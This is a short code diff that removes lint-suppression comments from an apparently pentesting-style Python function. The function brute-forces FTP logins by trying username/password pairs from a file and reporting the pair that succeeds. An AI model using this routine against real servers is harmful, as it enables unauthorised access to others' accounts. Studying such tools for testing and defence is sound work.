@@ -12,10 +12,10 @@ def brute_login(hostname, passwd_file):
             try:
                 ftp = ftplib.FTP(hostname)
                 ftp.login(userName, passWord)
-                print(f'[*] {str(hostname)} FTP Logon Succeeded: {userName}/{passWord}')  # noqa: E501
+                print(f'[*] {str(hostname)} FTP Logon Succeeded: {userName}/{passWord}')
                 ftp.quit()
                 return (userName, passWord)
-            except Exception as e:  # noqa: F841
+            except Exception as e:
                 pass
     print('[-] Could not brute force FTP credentials.')
     return (None, None)
